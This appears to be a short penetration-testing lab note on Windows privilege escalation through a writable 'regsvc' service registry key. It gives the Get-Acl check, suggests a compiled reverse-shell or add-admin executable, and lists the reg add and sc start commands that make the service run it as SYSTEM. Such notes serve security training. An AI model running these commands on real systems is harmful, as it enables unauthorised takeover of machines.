## ACL of regsvc
### Recon
- Check the access control lists of a registry service with:
```
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```
- If you see -  “NT AUTHORITY\INTERACTIVE” has “FullContol” then we can escalate.

### Exploitation
- Make a C file with code for rev-shell, adding admin user etc., compile into exe (using mingw).
- Copy it over to windows machine.
- Add to registry key using:
```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
```
Args:
- `/v` to name the subkey, here ImagePath (stores exe to run when service starts).
- `/t` for type, here REG_EXPAND_SZ means we are providing the path as a string.
- `/d` for the path to exe.
- `/f` just run, no need to confirm.
Now to run the service:
```
sc start regsvc
```
And you have successfully escalated.
